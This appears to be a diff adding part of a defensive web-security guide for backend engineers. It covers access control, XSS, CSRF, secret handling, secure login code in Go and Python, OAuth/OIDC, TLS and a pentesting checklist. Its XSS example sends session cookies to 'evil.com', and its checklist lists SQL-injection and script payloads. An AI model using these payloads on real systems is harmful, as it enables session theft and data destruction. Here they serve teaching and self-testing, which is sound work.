+-- A 404 gives the attacker no information -> is it missing, or forbidden?
+```
+
+<Callout type="info">
+Return **404 Not Found** (not 403 Forbidden) when a user requests a resource they don't own. A 403 tells the attacker "this exists, but you can't have it", confirming the resource's existence enables further attacks (enumeration, social engineering).
+</Callout>
+
+### (2) BFLA: Broken Function Level Authorization
+
+A regular user accesses admin-only endpoints because role checks are missing at the routing layer. Believing "nobody knows the /admin URL" is **security through obscurity**: which is not security at all.
+
+```go
+Go / Role Middlewarefunc RequireRole(role string) func(http.Handler) http.Handler {
+    return func(next http.Handler) http.Handler {
+        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+            user, ok := r.Context().Value("user").(User)
+            if !ok || user.Role != role {
+                http.Error(w, "forbidden", http.StatusForbidden)
+                return
+            }
+            next.ServeHTTP(w, r)
+        })
+    }
+}
+
+// Router setup
+r.With(RequireAuth, RequireRole("admin")).
+  Get("/admin/invoices", adminInvoicesHandler)
+```
+
+### The Horizontal vs Vertical Mental Model
+
+#### Horizontal Attack (BOLA)
+
+- User A reads/edits User B's resources
+- Scope widens _across users_
+- Fix: add `AND user_id = $ctx_user` to every query
+- Return 404, not 403
+
+#### Vertical Attack (BFLA)
+
+- Regular user accesses admin functions
+- Scope elevates _up privilege levels_
+- Fix: role middleware on every sensitive route
+- Default-deny: deny anything not explicitly allowed
+
+### Use UUIDs, Not Sequential IDs, in URLs
+
+Sequential IDs (`/invoices/101`, `/invoices/102`) let attackers enumerate all resources. A UUID like `/invoices/f47ac10b-58cc-4372-a567-0e02b2c3d479` is effectively unguessable, 2^122 possible values. Use UUIDs as primary keys in any table whose records are exposed in URLs.
+
+10
+
+## Cross-Site Scripting (XSS)
+
+XSS occurs when an attacker's JavaScript executes in another user's browser, in the context of your platform. It's injection, but the target is the browser's HTML/JS engine instead of the database.
+
+### Why XSS Is Dangerous
+
+JavaScript running in your platform's context can:
+
+- Read all `document.cookie` (session tokens not protected by HttpOnly).
+- Read `localStorage` (JWT tokens, API keys).
+- Make API requests as the logged-in user (impersonation).
+- Redirect users to phishing pages to steal credentials.
+- Alter page content to deceive the user (fake login forms, fake alerts).
+
+### Stored XSS: The Most Dangerous Type
+
+A user submits a comment/post containing a `<script>` tag. Your server stores it. Every user who views that post has the script execute in their browser.
+
+```text
+Stored XSS Attack<!-- Attacker submits this as a "comment" -->
+<script>
+  // Steal session cookie and send to attacker's server
+  fetch('https://evil.com/steal?c=' + document.cookie);
+
+  // Or silently redirect to phishing page
+  window.location = 'https://evil.com/fake-login';
+</script>
+
+<!-- This script is stored in your DB and injected into every user's browser -->
+```
+
+### Prevention: Sanitise Before Storing
+
+Before storing any user-provided HTML/markdown, strip dangerous tags and attributes. Use a battle-tested library; never write your own sanitiser.
+
+```python
+Python / bleach sanitisationimport bleach
+
+ALLOWED_TAGS = ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li']
+ALLOWED_ATTRS = {'a': ['href']}
+
+def sanitise_comment(raw_html: str) -> str:
+    # Strip ALL tags not in allow-list, strip dangerous attributes
+    return bleach.clean(
+        raw_html,
+        tags=ALLOWED_TAGS,
+        attributes=ALLOWED_ATTRS,
+        strip=True  # strip disallowed, don't escape
+    )
+
+# <script>...</script> -> stripped entirely
+# <b>bold</b> -> kept
+# <img onerror="..."> -> attribute stripped
+```
+
+### Content Security Policy (CSP): Last Line of Defence
+
+CSP is an HTTP response header that tells the browser _exactly_ which scripts are allowed to run. Even if an attacker injects a `<script>` tag, the browser blocks it if it violates the policy.
+
+```text
+HTTP Header / CSP# Only load scripts from your own domain. Block all inline scripts.
+Content-Security-Policy: default-src 'self';
+                         script-src 'self';
+                         object-src 'none';
+                         base-uri 'self'
+```
+
+<Callout type="info">
+CSP is a safety net, not a substitute for sanitisation. Fix the root cause first (sanitise input), then add CSP as a defence-in-depth layer.
+</Callout>
+
+11
+
+## CSRF: Cross-Site Request Forgery
+
+CSRF exploits the fact that browsers automatically attach cookies to requests, even when the request originates from a different website. An attacker on `evil.com` can trigger a request to `bank.com` and your browser includes your `bank.com` session cookie.
+
+<Callout type="info">
+**CSRF is largely a solved problem** in modern stacks. As long as you set `SameSite=Strict` or `SameSite=Lax` on your session cookie (which browsers default to `Lax`), and you configure CORS properly, you are protected. This section covers the theory for legacy systems.
+</Callout>
+
+### Mitigations
+
+- **SameSite cookie flag**: `Strict` or `Lax` blocks cookies from cross-origin requests. Modern browsers default to `Lax`.
+- **CORS configuration**: only allow requests from your own frontend domain.
+- **CSRF tokens**: for legacy form-based systems: embed a unique token in every form, verify it server-side.
+
+12
+
+## Misconfigurations: Security Holes You Create Yourself
+
+### (1) Secrets in Version Control
+
+The most catastrophically common mistake: API keys, database passwords, JWT secrets, or encryption keys committed to Git. Once in commit history, rotating the secret in code doesn't help, the old value is permanently in git log.
+
+<Callout type="info">
+**If you accidentally commit a secret to Git, immediately rotate/revoke it.** Deleting the file in a new commit does not remove it from history. Assume the secret is compromised the moment it touched a remote repository.
+</Callout>
+
+```text
+Shell / Pre-commit hook with gitleaks# Install: brew install gitleaks
+# .git/hooks/pre-commit
+gitleaks protect --staged --no-git -v
+# Blocks commit if API keys, passwords, tokens detected in staged files
+```
+
+### (2) Debug/Verbose Logs in Production
+
+In development, log level is typically `DEBUG`, full stack traces, SQL queries, request bodies. In production it must be `INFO` or `WARN`. Debug logs in production expose:
+
+- Table names, column names, query structure -> enables targeted SQL injection.
+- File paths and function names -> reveals codebase structure.
+- User PII accidentally logged -> GDPR violation + breach liability.
+
+```go
+Go / Environment-aware log levelimport "log/slog"
+
+func setupLogger() {
+    level := slog.LevelInfo  // default: production
+    if os.Getenv("APP_ENV") == "development" {
+        level = slog.LevelDebug
+    }
+    slog.SetDefault(slog.New(slog.NewJSONHandler(os.Stdout,
+        &slog.HandlerOptions{Level: level})))
+}
+```
+
+### (3) Security Headers
+
+A single middleware call adds all industry-standard security headers. Every major framework has one:
+
+| Header                            | Purpose                                                 |
+| --------------------------------- | ------------------------------------------------------- |
+| `Content-Security-Policy`         | Controls which scripts/resources can run (prevents XSS) |
+| `X-Frame-Options: DENY`           | Prevents embedding in iframes (prevents clickjacking)   |
+| `X-Content-Type-Options: nosniff` | Prevents MIME-type sniffing attacks                     |
+| `Strict-Transport-Security`       | Forces HTTPS, prevents SSL stripping                    |
+| `Referrer-Policy`                 | Controls how much referrer info is sent cross-origin    |
+
+```text
+Go / Secure Headers Middleware (chi/middleware)import "github.com/go-chi/chi/v5/middleware"
+
+r.Use(middleware.SetHeader("X-Frame-Options", "DENY"))
+r.Use(middleware.SetHeader("X-Content-Type-Options", "nosniff"))
+r.Use(middleware.SetHeader("Referrer-Policy", "strict-origin-when-cross-origin"))
+r.Use(middleware.SetHeader(
+    "Strict-Transport-Security",
+    "max-age=63072000; includeSubDomains; preload"))
+r.Use(middleware.SetHeader(
+    "Content-Security-Policy",
+    "default-src 'self'; script-src 'self'; object-src 'none'"))
+```
+
+13
+
+## Defence in Depth: No Single Layer Is Enough
+
+> "No single defence is perfect. Build in layers. An attacker must bypass all of them simultaneously, which is exponentially harder."
+
+<Diagram caption="Fig 7: Defence in depth: attacker must break through every layer to reach your core business logic.">
+<svg viewBox="0 0 680 240" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="240" fill="var(--dg-paper)"></rect><circle cx="340" cy="120" r="200" fill="none" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></circle><circle cx="340" cy="120" r="160" fill="none" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></circle><circle cx="340" cy="120" r="120" fill="none" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></circle><circle cx="340" cy="120" r="80" fill="none" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></circle><circle cx="340" cy="120" r="40" fill="var(--dg-surface)" stroke="var(--dg-line)"></circle><text x="340" y="116" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="10" font-weight="700">Core</text><text x="340" y="128" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="10">Logic</text><text x="340" y="66" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Input Validation</text><text x="340" y="24" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Parameterised Ops</text><text x="536" y="120" text-anchor="middle" fill="var(--dg-info)" font-family="var(--font-ui)" font-size="11" font-weight="700">AuthN / AuthZ</text><text x="144" y="120" text-anchor="middle" fill="var(--dg-info)" font-family="var(--font-ui)" font-size="11" font-weight="700">Rate Limiting</text><text x="340" y="176" text-anchor="middle" fill="var(--dg-info)" font-family="var(--font-ui)" font-size="11" font-weight="700">Security Headers + CSP</text><text x="340" y="216" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="11" font-weight="700">Monitoring + Audit Logs</text></svg>
+</Diagram>
+
+### The Three Questions to Ask at Every Boundary
+
+1. **Where is data crossing a boundary?** (User -> SQL, User -> Shell, User -> HTML)
+2. **What am I assuming about this data?** (Is it clean? Is it a valid email? Is it safe?)
+3. **What if those assumptions are wrong?** (What does the attacker gain if they violate this assumption?)
+
+If you ask these three questions for every piece of code that handles user input, you will avoid 99% of the vulnerabilities that break real production systems.
+
+14
+
+## Go: Secure Patterns Reference
+
+### Complete Secure Login Endpoint
+
+```go
+Gofunc loginHandler(db *pgxpool.Pool, redis *redis.Client) http.HandlerFunc {
+    return func(w http.ResponseWriter, r *http.Request) {
+        var req struct {
+            Email    string `json:"email"`
+            Password string `json:"password"`
+        }
+        json.NewDecoder(r.Body).Decode(&req)
+
+        // 1. Validate format (first line of defence)
+        if !isValidEmail(req.Email) || len(req.Password) < 8 {
+            http.Error(w, "invalid credentials", 400)
+            return
+        }
+
+        // 2. Parameterised query, no SQL injection possible
+        var userID string
+        var hashedPass string
+        err := db.QueryRow(ctx,
+            "SELECT id, password_hash FROM users WHERE email = $1",
+            req.Email).Scan(&userID, &hashedPass)
+
+        // 3. Generic error, never reveal whether email exists
+        if err != nil || !verifyArgon2(req.Password, hashedPass) {
+            http.Error(w, "invalid email or password", 401)
+            return
+        }
+
+        // 4. Cryptographically secure session ID
+        sessionID := generateSecureToken(32)
+
+        // 5. Store session in Redis with metadata
+        redis.Set(ctx, "session:"+sessionID,
+            userID, 7*24*time.Hour)
+
+        // 6. Secure cookie, HttpOnly, Secure, SameSite=Strict
+        http.SetCookie(w, &http.Cookie{
+            Name: "session_id", Value: sessionID,
+            HttpOnly: true, Secure: true,
+            SameSite: http.SameSiteStrictMode,
+            MaxAge: 7 * 24 * 3600,
+        })
+        w.WriteHeader(http.StatusOK)
+    }
+}
+
+func generateSecureToken(n int) string {
+    b := make([]byte, n)
+    rand.Read(b) // crypto/rand, not math/rand
+    return base64.URLEncoding.EncodeToString(b)
+}
+```
+
+15
+
+## Python: Secure Patterns Reference
+
+```python
+Python / FastAPI Secure Authfrom fastapi import FastAPI, HTTPException, Response
+from argon2 import PasswordHasher
+from argon2.exceptions import VerifyMismatchError
+import secrets
+
+ph = PasswordHasher(time_cost=1, memory_cost=65536, parallelism=4)
+
+@app.post("/login")
+async def login(email: str, password: str, response: Response):
+    # 1. Parameterised query (psycopg2 / asyncpg)
+    row = await db.fetchrow(
+        "SELECT id, password_hash FROM users WHERE email = $1", email
+    )
+
+    # 2. Constant-time verify. Generic error always.
+    valid = False
+    if row:
+        try:
+            ph.verify(row["password_hash"], password)
+            valid = True
+        except VerifyMismatchError:
+            pass
+
+    if not valid:
+        raise HTTPException(401, "invalid email or password")
+
+    # 3. Cryptographically secure session token (32 bytes = 256 bits)
+    session_id = secrets.token_urlsafe(32)
+    await redis.set(f"session:{session_id}", row["id"], ex=604800)
+
+    # 4. HttpOnly + Secure + SameSite cookie
+    response.set_cookie(
+        key="session_id", value=session_id,
+        httponly=True, secure=True,
+        samesite="strict", max_age=604800
+    )
+    return {"status": "ok"}
+```
+
+```python
+Python / BOLA-safe DB queryasync def get_invoice(invoice_id: int, current_user_id: int):
+    # ownership check IN the query, not after
+    row = await db.fetchrow(
+        "SELECT * FROM invoices WHERE id=$1 AND user_id=$2",
+        invoice_id, current_user_id
+    )
+    if not row:
+        # 404, not 403. Don't confirm the invoice exists.
+        raise HTTPException(404, "invoice not found")
+    return row
+```
+
+16
+
+## OAuth 2.0 & OIDC: Delegated Authentication
+
+OAuth 2.0 is an **authorization framework** that allows a third-party application to obtain limited access to a user's account on another service, without ever seeing the user's password. OpenID Connect (OIDC) is a thin identity layer on top of OAuth 2.0 that adds authentication (who the user _is_), not just authorization (what they can _do_).
+
+> "Sign in with Google" is OIDC. "Allow this app to read your Google Drive" is OAuth 2.0. In practice, modern auth providers (Clerk, Auth0) combine both.
+
+### The Four Roles
+
+| Role                     | Who It Is                   | Example               |
+| ------------------------ | --------------------------- | --------------------- |
+| **Resource Owner**       | The user                    | Alice                 |
+| **Client**               | Your application            | YourSaaS.com          |
+| **Authorization Server** | Issues tokens after consent | Google, GitHub, Auth0 |
+| **Resource Server**      | API that holds user data    | Google Calendar API   |
+
+### Authorization Code Flow: The Secure Standard
+
+This is the flow used by every serious web application. It keeps tokens off the browser URL bar and exchanges a short-lived _code_ for tokens server-side.
+
+<Diagram caption="Fig A: OAuth 2.0 Authorization Code Flow with PKCE. Steps (6)-(7) are server-to-server, tokens never touch the browser URL bar.">
+<svg viewBox="0 0 680 420" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="420" fill="var(--dg-paper)"></rect><defs><marker id="oa" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ink-2)"></path></marker><marker id="ob" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-accent)"></path></marker><marker id="og" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ok)"></path></marker><marker id="ob2" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-info)"></path></marker></defs><text x="70" y="28" text-anchor="middle" font-family="var(--font-ui)" font-size="13" font-weight="700" fill="var(--dg-ink)">Browser / User</text><text x="310" y="28" text-anchor="middle" font-family="var(--font-ui)" font-size="13" font-weight="700" fill="var(--dg-ink)">Your Backend</text><text x="570" y="28" text-anchor="middle" font-family="var(--font-ui)" font-size="13" font-weight="700" fill="var(--dg-ink)">Auth Server (Google)</text><line x1="70" y1="35" x2="70" y2="410" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></line><line x1="310" y1="35" x2="310" y2="410" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></line><line x1="570" y1="35" x2="570" y2="410" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></line><line x1="72" y1="60" x2="308" y2="60" stroke="var(--dg-accent)" stroke-width="1.5" marker-end="url(#ob)"></line><rect x="90" y="42" width="200" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="190" y="54" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-accent)">(1) Click "Sign in with Google"</text><line x1="308" y1="90" x2="72" y2="90" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#oa)"></line><rect x="90" y="72" width="210" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="190" y="84" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ink-2)">(2) Redirect to Google + state + code&#95;challenge</text><line x1="72" y1="130" x2="568" y2="130" stroke="var(--dg-accent)" stroke-width="1.5" marker-end="url(#ob)"></line><rect x="160" y="112" width="260" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="290" y="124" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-accent)">(3) Browser navigates to Google login + consent screen</text><line x1="568" y1="170" x2="72" y2="170" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#oa)"></line><rect x="160" y="152" width="250" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="290" y="164" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ink-2)">(4) Google redirects back with authorization&#95;code</text><line x1="72" y1="210" x2="308" y2="210" stroke="var(--dg-accent)" stroke-width="1.5" marker-end="url(#ob)"></line><rect x="90" y="192" width="200" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="190" y="204" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-accent)">(5) Browser sends code to your backend callback</text><line x1="312" y1="250" x2="568" y2="250" stroke="var(--dg-ok)" stroke-width="1.8" marker-end="url(#og)"></line><rect x="360" y="232" width="190" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="445" y="244" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ok)">(6) Backend exchanges code -> access&#95;token + id&#95;token</text><text x="445" y="260" text-anchor="middle" font-family="var(--font-diagram-mono)" font-size="9" fill="var(--dg-ink-2)">(server-to-server, never touches browser)</text><line x1="568" y1="285" x2="312" y2="285" stroke="var(--dg-ok)" stroke-width="1.8" marker-end="url(#og)"></line><rect x="360" y="268" width="180" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="445" y="280" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ok)">(7) Google returns tokens + user info (sub, email)</text><line x1="308" y1="325" x2="72" y2="325" stroke="var(--dg-info)" stroke-width="1.5" marker-end="url(#ob2)"></line><rect x="90" y="308" width="200" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="190" y="320" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-info)">(8) Backend creates session -> sets HttpOnly cookie</text><rect x="20" y="350" width="640" height="50" rx="8" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="340" y="372" text-anchor="middle" font-family="var(--font-ui)" font-size="12" font-weight="700" fill="var(--dg-ok)">PKCE, Proof Key for Code Exchange</text><text x="340" y="390" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ink-2)">client generates code&#95;verifier (random) -> hashes it to code&#95;challenge -> sent in step (2)</text><text x="340" y="404" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ink-2)">Google checks verifier in step (6) -> prevents authorization code interception attacks</text></svg>
+</Diagram>
+
+### Key Security Rules for OAuth
+
+- **Always use PKCE**: even for server-side apps. It prevents code interception attacks where an attacker intercepts the `code` from the redirect URL.
+- **Validate the `state` parameter**: generate a random value, store it in the session before redirect, verify it when Google redirects back. This prevents CSRF on the OAuth flow itself.
+- **Never expose `access_token` to the browser**: exchange the code server-side and issue your own session cookie. The access token is a credential; treat it like a password.
+- **Link OAuth to existing accounts by email carefully**: if a user already has an email+password account and signs in via Google with the same email, you must decide: auto-link (convenient, small risk) or require confirmation. Auto-linking without verification enables account takeover if the OAuth provider is compromised.
+- **Verify the `aud` (audience) claim** in the id\_token, ensures the token was issued for _your_ app, not another OAuth client using the same provider.
+
+### OIDC vs OAuth 2.0: One-Line Difference
+
+| Protocol      | Answers                 | Token                                            |
+| ------------- | ----------------------- | ------------------------------------------------ |
+| **OAuth 2.0** | "What can this app do?" | Access Token (opaque or JWT)                     |
+| **OIDC**      | "Who is this user?"     | ID Token (always JWT with `sub`, `email`, `iat`) |
+
+```go
+Go / Verify OIDC ID Token (google/go-oidc)import (
+    "github.com/coreos/go-oidc/v3/oidc"
+    "golang.org/x/oauth2"
+)
+
+var (
+    provider, _ = oidc.NewProvider(ctx, "https://accounts.google.com")
+    verifier     = provider.Verifier(&oidc.Config{ClientID: os.Getenv("GOOGLE_CLIENT_ID")})
+    oauth2Cfg    = &oauth2.Config{
+        ClientID:     os.Getenv("GOOGLE_CLIENT_ID"),
+        ClientSecret: os.Getenv("GOOGLE_CLIENT_SECRET"),
+        RedirectURL:  "https://yourapp.com/auth/callback",
+        Scopes:       []string{oidc.ScopeOpenID, "email", "profile"},
+        Endpoint:     provider.Endpoint(),
+    }
+)
+
+func callbackHandler(w http.ResponseWriter, r *http.Request) {
+    // 1. Verify state matches what we stored in session (CSRF protection)
+    if r.URL.Query().Get("state") != getSessionState(r) {
+        http.Error(w, "invalid state", 400); return
+    }
+
+    // 2. Exchange code for tokens (server-to-server)
+    token, _ := oauth2Cfg.Exchange(ctx, r.URL.Query().Get("code"))
+    rawIDToken := token.Extra("id_token").(string)
+
+    // 3. Verify ID token signature + aud + exp
+    idToken, err := verifier.Verify(ctx, rawIDToken)
+    if err != nil { http.Error(w, "invalid token", 401); return }
+
+    // 4. Extract claims
+    var claims struct { Email string `json:"email"`; Sub string `json:"sub"` }
+    idToken.Claims(&claims)
+
+    // 5. Upsert user in DB, create session, set cookie
+    userID := upsertUser(claims.Sub, claims.Email)
+    setSecureSessionCookie(w, userID)
+    http.Redirect(w, r, "/dashboard", http.StatusFound)
+}
+```
+
+17
+
+## HTTPS & TLS Internals
+
+HTTPS is HTTP with a TLS (Transport Layer Security) layer between the TCP connection and your HTTP messages. Everything inside it, headers, body, cookies, tokens, is encrypted in transit. An attacker who intercepts the packets sees only random ciphertext.
+
+### Why TLS Matters to a Backend Engineer
+
+- Without HTTPS, session cookies and JWT tokens are stolen by anyone on the same Wi-Fi (Wireshark captures them in plaintext).
+- The `Secure` cookie flag only works over HTTPS, without it, cookies are sent over HTTP too.
+- HTTP/2 (and HTTP/3) require TLS, no TLS means no performance benefits.
+- Search engines penalise HTTP sites; browsers show "Not Secure" warnings.
+
+### The TLS Handshake: What Actually Happens
+
+<Diagram caption="Fig B, TLS 1.3 handshake. The session key is derived, never transmitted, forward secrecy means past sessions can't be decrypted even if the server's private key is later stolen.">
+<svg viewBox="0 0 680 360" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="360" fill="var(--dg-paper)"></rect><defs><marker id="ta" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ink-2)"></path></marker><marker id="tg" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ok)"></path></marker><marker id="tb" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-info)"></path></marker></defs><text x="120" y="28" text-anchor="middle" font-family="var(--font-ui)" font-size="13" font-weight="700" fill="var(--dg-ink)">Client (Browser)</text><text x="560" y="28" text-anchor="middle" font-family="var(--font-ui)" font-size="13" font-weight="700" fill="var(--dg-ink)">Server (Your Backend)</text><line x1="120" y1="35" x2="120" y2="350" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></line><line x1="560" y1="35" x2="560" y2="350" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></line><line x1="122" y1="60" x2="558" y2="60" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#ta)"></line><text x="340" y="52" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ink-2)">(1) ClientHello: TLS version, cipher suites, random&#95;client</text><line x1="558" y1="100" x2="122" y2="100" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#ta)"></line><text x="340" y="92" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ink-2)">(2) ServerHello: chosen cipher, random&#95;server, certificate (public key)</text><rect x="20" y="115" width="200" height="35" rx="6" fill="var(--dg-warn-surface)" stroke="var(--dg-warn)"></rect><text x="120" y="130" text-anchor="middle" font-family="var(--font-ui)" font-size="10" fill="var(--dg-warn)" font-weight="700">(3) Client verifies cert</text><text x="120" y="143" text-anchor="middle" font-family="var(--font-ui)" font-size="10" fill="var(--dg-ink-2)">Chain of trust -> root CA</text><line x1="122" y1="175" x2="558" y2="175" stroke="var(--dg-info)" stroke-width="1.5" marker-end="url(#tb)"></line><text x="340" y="167" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-info)">(4) Key Exchange (ECDHE): client sends key share encrypted with server's public key</text><rect x="160" y="190" width="360" height="30" rx="6" fill="var(--dg-info-surface)" stroke="var(--dg-info)"></rect><text x="340" y="210" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-info)">(5) Both sides independently derive the same symmetric session key</text><text x="340" y="222" text-anchor="middle" font-family="var(--font-diagram-mono)" font-size="9" fill="var(--dg-ink-2)">(using random&#95;client + random&#95;server + key material, never transmitted)</text><line x1="122" y1="245" x2="558" y2="245" stroke="var(--dg-ok)" stroke-width="1.5" marker-end="url(#tg)"></line><text x="340" y="237" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ok)">(6) Client Finished (MAC of entire handshake)</text><line x1="558" y1="270" x2="122" y2="270" stroke="var(--dg-ok)" stroke-width="1.5" marker-end="url(#tg)"></line><text x="340" y="262" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ok)">(7) Server Finished, handshake complete</text><rect x="60" y="290" width="560" height="40" rx="8" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="340" y="310" text-anchor="middle" font-family="var(--font-ui)" font-size="12" font-weight="700" fill="var(--dg-ok)">(8) All subsequent HTTP traffic encrypted with symmetric session key (AES-GCM)</text><text x="340" y="325" text-anchor="middle" font-family="var(--font-ui)" font-size="10" fill="var(--dg-ink-2)">Eavesdropper sees: random bytes. Session cookie, JWT, passwords, all invisible.</text></svg>
+</Diagram>
+
+### Key Concepts
+
+| Concept                        | What It Means                                                                | Why It Matters                                                |
+| ------------------------------ | ---------------------------------------------------------------------------- | ------------------------------------------------------------- |
+| **Certificate**                | Server's public key + identity, signed by a CA                               | Proves you're talking to the real server, not an impersonator |
+| **Certificate Authority (CA)** | Trusted third party that signs certs (Let's Encrypt, DigiCert)               | Chain of trust: browser trusts CA -> CA vouches for server    |
+| **ECDHE**                      | Elliptic Curve Diffie-Hellman Ephemeral key exchange                         | Forward secrecy: each session uses a fresh key pair           |
+| **Forward Secrecy**            | Session keys aren't stored; can't decrypt past traffic even with private key | A future key compromise doesn't expose old sessions           |
+| **HSTS**                       | HTTP Strict Transport Security header                                        | Forces HTTPS for your domain, prevents SSL-stripping attacks  |
+| **TLS 1.3**                    | Current standard (2018). Dropped weak ciphers from TLS 1.2                   | Faster (1-RTT handshake), no known vulnerabilities            |
+
+### Practical Checklist for Your Backend
+
+- Use **Let's Encrypt** (free, auto-renewing) or your cloud provider's certificate manager.
+- Set `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, tells browsers to always use HTTPS for your domain for 2 years.
+- Redirect all `http://` traffic to `https://` at the load balancer / reverse proxy level (nginx, Caddy, Traefik).
+- Disable TLS 1.0 and TLS 1.1, they have known vulnerabilities (POODLE, BEAST). Only allow TLS 1.2 and TLS 1.3.
+- Test your TLS config at [ssllabs.com/ssltest](https://www.ssllabs.com/ssltest/), aim for an A+ rating.
+
+```text
+Caddy / Automatic HTTPS (zero config)# Caddyfile, Caddy automatically obtains and renews Let's Encrypt certs
+yourapp.com {
+    reverse_proxy localhost:8080
+    # TLS 1.2+ enforced, HSTS set, HTTP redirected, all automatic
+}
+
+# nginx equivalent
+server {
+    listen 443 ssl;
+    ssl_certificate     /etc/letsencrypt/live/yourapp.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/yourapp.com/privkey.pem;
+    ssl_protocols       TLSv1.2 TLSv1.3;   # disable 1.0 and 1.1
+    ssl_ciphers         ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
+    add_header Strict-Transport-Security "max-age=63072000" always;
+}
+```
+
+18
+
+## Penetration Testing Mindset: Think Before You Ship
+
+Penetration testing (pentesting) is the practice of attacking your own system the way a real attacker would, before they get the chance. You don't need to be a professional pentester to apply this mindset. The goal is to build the habit of asking _"how would I break this?"_ before you deploy.
+
+### The Attacker's Methodology (OWASP Testing Guide)
+
+1. **Reconnaissance**: What endpoints exist? What technology stack? What error messages leak? (`nmap`, Google dorking, examining JS bundles)
+2. **Enumeration**: What user IDs exist? What routes? Fuzz with sequential IDs, common paths (`/admin`, `/.env`, `/api/v1`)
+3. **Exploitation**: Try injection payloads, bypass auth, escalate privileges
+4. **Post-exploitation**: What can be exfiltrated, modified, or destroyed?
+
+### Quick Self-Audit Checklist
+
+Before shipping any feature that touches user data or auth, run through these manually or in automated tests:
+
+| Check                | What to Test                                                                   | Tool / Method        |
+| -------------------- | ------------------------------------------------------------------------------ | -------------------- |
+| **SQL Injection**    | Put `'`, `'; DROP TABLE--`, `' OR '1'='1` in every input field                 | sqlmap, manual       |
+| **BOLA**             | Logged in as User A, request User B's resource IDs                             | Manual + Burp Suite  |
+| **BFLA**             | Remove admin cookie/role, try hitting admin endpoints                          | Manual               |
+| **XSS**              | Submit `<script>alert(1)</script>` in every text field                         | Manual, OWASP ZAP    |
+| **Auth bypass**      | Remove auth header entirely. Try expired tokens. Try tokens from another user. | Manual               |
+| **Secrets**          | Search codebase and git history for hardcoded keys                             | gitleaks, trufflehog |
+| **Security headers** | Check response headers for CSP, HSTS, X-Frame-Options                          | securityheaders.com  |
+| **Rate limiting**    | Send 100+ login attempts, check if blocked                                     | curl loop, k6        |
+
+### Burp Suite: The Standard Tool
+
+Burp Suite Community Edition (free) is a proxy that sits between your browser and your backend, letting you intercept, modify, and replay every request. It's the most widely used tool for manual pentesting.
+
+- **Intercept**: pause a request mid-flight and modify any parameter before it hits your server.
+- **Repeater**: replay a request with different payloads (great for testing injection).
+- **Intruder**: automated fuzzing, try thousands of payloads against a parameter automatically.
